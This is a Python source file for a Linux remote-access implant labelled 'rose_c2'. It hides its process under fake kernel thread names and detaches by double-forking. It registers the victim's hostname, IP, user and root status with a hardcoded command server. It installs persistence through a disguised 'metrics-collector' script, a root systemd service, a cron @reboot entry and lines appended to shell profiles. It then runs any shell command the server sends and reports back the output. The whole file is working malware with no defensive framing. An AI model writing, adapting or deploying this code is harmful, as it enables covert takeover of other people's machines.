#!/usr/bin/env python3
import os, sys, ctypes, random, base64, json, time, urllib.request, urllib.error
import subprocess, platform, socket, hashlib, hmac, threading, ssl, getpass
from urllib.parse import urlencode

# Configuration
SERVER_URL = "https://192.168.10.11:443/"
AGENT_NAME = "example5"
AGENT_TYPE = "rose_c2"
AUTH_TOKEN = "plaintext_really"

# SSL context for self-signed certificates
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def print_debug(message):
    """Debug logging - in production this would write to a hidden log file"""
    pass  # Suppress all output in production

def comprehensive_stealth():
    """Complete process hiding including argv overwrite"""
    try:
        # Choose a legitimate system process name
        new_name = random.choice(["systemd", "kthreadd", "ksoftirqd", "migration", "rcu_gp"])
        
        # 1. Change process name using prctl
        ctypes.CDLL(None).prctl(15, new_name.encode())
        
        # 2. Overwrite argv to completely hide Python
        # Create a new argv with our fake name
        new_argv = [new_name]
        # Pad with empty strings to overwrite all original arguments
        while len(new_argv) < len(sys.argv):
            new_argv.append("")
        
        # Replace the original argv
        sys.argv = new_argv
        
        # 3. Fork to detach
        pid = os.fork()
        if pid > 0:
            os._exit(0)
        elif pid == 0:
            # Child process continues
            os.setsid()
            pid = os.fork()
            if pid > 0:
                os._exit(0)
            elif pid == 0:
                # Second child continues
                # Change process name again in the final process
                ctypes.CDLL(None).prctl(15, new_name.encode())
                return True
            else:
                # Second fork failed
                return False
        else:
            # First fork failed
            return False
    except Exception as e:
        return False

def wait_for_network(timeout=60):
    """Wait until network is available"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except OSError:
            time.sleep(2)
    return False

def get_platform_info():
    """Get platform information for system identification"""
    try:
        if hasattr(platform, 'freedesktop_os_release'):
            info = platform.freedesktop_os_release()
            return (info.get('ID', 'linux'), info.get('VERSION_ID', ''), info.get('NAME', ''))
        elif os.path.isfile("/etc/os-release"):
            info = {}
            with open("/etc/os-release") as f:
                for line in f:
                    match = line.match(r'^([A-Z_]+)="?([^"\n]+)"?\$', line)
                    if match:
                        info[match.group(1)] = match.group(2)
            return (info.get('ID', 'linux'), info.get('VERSION_ID', ''), info.get('PRETTY_NAME', ''))
    except:
        pass
    return (platform.system(), platform.release(), platform.version())

def get_system_info():
    """Collect system information for C2 registration"""
    try:
        # Get IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
        except:
            ip_address = "127.0.0.1"
        finally:
            s.close()
        
        # Get OS info
        os_info = get_platform_info()
        os_string = f"{os_info[2]} {os_info[1]}" if os_info[2] else f"{os_info[0]} {os_info[1]}"
        
        # Get permissions
        is_root = (os.geteuid() == 0)
        username = getpass.getuser()
        
        return {
            "hostname": socket.gethostname(),
            "ip": ip_address,
            "os": os_string,
            "user": username,
            "admin": is_root
        }
    except:
        return {
            "hostname": "unknown",
            "ip": "127.0.0.1",
            "os": "unknown",
            "user": "unknown",
            "admin": False
        }

def send_to_server(endpoint, data=None, timeout=10):
    """Send data to C2 server with stealth techniques"""
    global AUTH_TOKEN
    
    try:
        url = f"{SERVER_URL}{endpoint}"
        
        # Prepare payload
        system_info = get_system_info()
        payload = {
            "name": AGENT_NAME,
            "hostname": system_info["hostname"],
            "ip": system_info["ip"],
            "os": system_info["os"],
            "user": system_info["user"],
            "admin": system_info["admin"],
            "auth": AUTH_TOKEN,
            "agent_type": AGENT_TYPE,
            "oldStatus": True,
            "newStatus": True
        }
        
        if data:
            payload.update(data)
        
        # Convert to JSON
        json_data = json.dumps(payload).encode("utf-8")
        
        # Prepare headers with realistic user agents
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
                "curl/8.2.1"
            ]),
            "Accept": "application/json,text/plain,*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Content-Type": "application/json"
        }
        
        # Create request
        req = urllib.request.Request(url, data=json_data, headers=headers, method="POST")
        
        # Send request
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as response:
            if response.getcode() == 200:
                response_text = response.read().decode("utf-8", errors="ignore")
                
                # Update auth token if this is a beacon response
                if "agent/beacon" in endpoint and response_text != AUTH_TOKEN:
                    AUTH_TOKEN = response_text
                
                return True, response_text
            else:
                return False, f"HTTP {response.getcode()}"
    
    except Exception as e:
        return False, str(e)

def create_persistence():
    """Create multiple persistence mechanisms"""
    try:
        # Create a wrapper script with encoded C2 details
        python_path = sys.executable
        script_path = os.path.abspath(__file__)
        
        # Create a random wrapper script name
        wrapper_dirs = ["/usr/local/bin", "/opt", "/usr/bin"]
        wrapper_dir = random.choice(wrapper_dirs)
        
        # Ensure directory exists
        try:
            os.makedirs(wrapper_dir, exist_ok=True)
        except:
            pass  # Fallback to temp directory if can't create in system dirs
        
        wrapper_name = random.choice([
            "metrics-collector-helper",
            "system-metrics-collector",
            "network-metrics-helper"
        ])
        
        wrapper_path = os.path.join(wrapper_dir, wrapper_name)
        
        # Create wrapper script with encoded C2 details
        c2_config = f"{SERVER_URL} {AUTH_TOKEN}"
        encoded_config = base64.b64encode(c2_config.encode()).decode()
        
        wrapper_content = f"""#!/bin/bash
# System Metrics Collection Helper
# This script is part of the system metrics collection infrastructure

# Decode configuration
CONFIG=$(echo "{encoded_config}" | base64 -d)

# Extract server URL and auth token
SERVER_URL=$(echo "$CONFIG" | cut -d' ' -f1)
AUTH_TOKEN=$(echo "$CONFIG" | cut -d' ' -f2)

# Execute the main script with decoded configuration
{python_path} {script_path} > /dev/null 2>&1
"""
        
        # Write wrapper script
        try:
            with open(wrapper_path, 'w') as f:
                f.write(wrapper_content)
            
            # Make executable
            os.chmod(wrapper_path, 0o755)
        except:
            return False
        
        # Try to create systemd service
        try:
            service_name = "metrics-collector.service"
            service_path = f"/etc/systemd/system/{service_name}"
            
            service_content = f"""[Unit]
Description=System Metrics Collection Service
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart={wrapper_path}
Restart=always
RestartSec=30
User=root
Group=root
StandardOutput=null
StandardError=null
SyslogIdentifier=metrics-collector
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/tmp /var/tmp
ProtectKernelTunables=true
ProtectControlGroups=true
RestrictRealtime=true
MemoryDenyWriteExecute=true
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6 AF_NETLINK

[Install]
WantedBy=multi-user.target
"""
            
            # Write service file using sudo
            process = subprocess.Popen(["sudo", "tee", service_path], stdin=subprocess.PIPE, text=True)
            process.communicate(input=service_content)
            
            if process.returncode == 0:
                # Set permissions using sudo
                subprocess.run(["sudo", "chmod", "644", service_path], check=False)
                
                # Enable and start the service using sudo
                subprocess.run(["sudo", "systemctl", "daemon-reload"], check=False)
                subprocess.run(["sudo", "systemctl", "enable", service_name], check=False)
                subprocess.run(["sudo", "systemctl", "start", service_name], check=False)
                
                return True
        except:
            pass
        
        # Fallback to cron job
        try:
            # Create cron entry
            cron_entry = f"@reboot {wrapper_path} > /dev/null 2>&1\n"
            
            # Read existing crontab
            result = subprocess.run(["crontab", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            existing_cron = result.stdout if result.returncode == 0 else ""
            
            # Check if our entry already exists
            if wrapper_path not in existing_cron:
                # Add our entry
                new_cron = existing_cron + cron_entry
                
                # Write new crontab
                process = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                process.communicate(input=new_cron)
                
                if process.returncode == 0:
                    return True
        except:
            pass
        
        # Last resort: add to profile files
        try:
            home_dir = os.path.expanduser("~")
            profile_files = [
                os.path.join(home_dir, ".bashrc"),
                os.path.join(home_dir, ".profile"),
                os.path.join(home_dir, ".zshrc")
            ]
            
            for profile_file in profile_files:
                if os.path.exists(profile_file):
                    with open(profile_file, 'a') as f:
                        f.write(f"\n# System metrics check\nnohup {wrapper_path} > /dev/null 2>&1 &\n")
                    return True
        except:
            pass
        
        return False
    except:
        return False

def execute_task(task_id, task_command):
    """Execute a task and return the result"""
    try:
        resultobj = subprocess.run(
            task_command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=15,
            check=False
        )
        result = f"ReturnCode: {resultobj.returncode}. STDOUT: {resultobj.stdout}. STDERR: {resultobj.stderr}."
        return result
    except Exception as e:
        return f"unexpected exception when trying to execute task: {str(e)[:100]}"

def agent_loop():
    """Main agent communication loop"""
    while True:
        try:
            # Check for pause state
            status, response = send_to_server("agent/get_pause")
            if status:
                try:
                    pause_until = float(response)
                    if pause_until > time.time():
                        time.sleep(pause_until - time.time())
                        continue
                except:
                    pass
            
            # Check for tasks
            status, response = send_to_server("agent/get_task")
            if status and response != "no pending tasks":
                try:
                    data = json.loads(response)
                    task_id = data.get('task_id')
                    task_command = data.get('task')
                    
                    if task_id and task_command:
                        # Execute the task
                        result = execute_task(task_id, task_command)
                        
                        # Send result back to server
                        resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':'))
                        send_to_server("agent/set_task_result", {"message": resultjson})
                except json.JSONDecodeError:
                    pass
            
            # Add jitter to sleep time
            jittered_sleep = 60 + random.randint(-10, 10)
            time.sleep(jittered_sleep)
        
        except Exception as e:
            # Handle any unexpected errors in the main loop
            time.sleep(30)  # Wait a bit before retrying

def main():
    # Apply comprehensive stealth
    comprehensive_stealth()
    
    # Wait for network connectivity
    if not wait_for_network():
        print_debug("Network not available after waiting")
        return
    
    # Create persistence mechanisms
    create_persistence()
    
    # Initial registration with server
    send_to_server("agent/beacon", {"message": "register"})
    
    # Start the main agent loop
    agent_loop()

if __name__ == "__main__":
    main()